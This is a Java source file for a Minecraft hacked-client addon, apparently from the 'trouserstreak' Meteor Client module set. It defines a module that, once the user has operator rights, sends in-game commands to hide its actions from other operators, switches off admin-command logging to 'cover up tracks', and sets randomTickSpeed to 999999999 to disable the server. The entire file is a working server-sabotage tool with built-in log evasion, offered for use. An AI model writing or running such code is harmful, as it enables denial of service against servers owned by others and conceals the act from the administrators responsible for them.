package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import pwn.noobs.trouserstreak.Trouser;

public class OPServerKillModule extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    public final Setting<Boolean> notOP = sgGeneral.add(new BoolSetting.Builder()
            .name("Toggle Module if not OP")
            .description("Turn this off to prevent the bug of module always being turned off when you join server.")
            .defaultValue(false)
            .build()
    );
    private final Setting<Boolean> sendCommandFeedback = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off sendCommandFeedback")
            .description("Makes commands invisible to other operators.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> logAdminCommands = sgGeneral.add(new BoolSetting.Builder()
            .name("turn off logAdminCommands")
            .description("Hides the kill command from console logs.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
            .name("Tick Delay")
            .description("The delay between commands sent.")
            .defaultValue(1)
            .min(0)
            .build()
    );
    private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
            .name("randomTickSpeed (kill value)")
            .description("This is what kills server. Max value is best.")
            .defaultValue(999999999)
            .min(0)
            .max(999999999)
            .sliderRange(0, 999999999)
            .build()
    );
    public OPServerKillModule() {
        super(Trouser.Main, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
    }

    private int ticks=0;

    @Override
    public void onActivate() {
        if (notOP.get() && !(mc.player.hasPermissionLevel(4)) && mc.world.isChunkLoaded(mc.player.getChunkPos().x, mc.player.getChunkPos().z)) {
            toggle();
            error("Must have OP");
        }
        ticks=0;
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        ticks++;
        if (sendCommandFeedback.get() && logAdminCommands.get()){
            if (ticks == 1*tickdelay.get()){ //prevent people from seeing the commands being executed
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 3*tickdelay.get()){ //kill server
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
        } else if (!sendCommandFeedback.get() && logAdminCommands.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
            }
            if (ticks == 2*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
        } else if (sendCommandFeedback.get() && !logAdminCommands.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
            }
            if (ticks == 2*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
        } else if (!sendCommandFeedback.get() && !logAdminCommands.get()){
            if (ticks == 1*tickdelay.get()){
                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
            }
        }
    }
}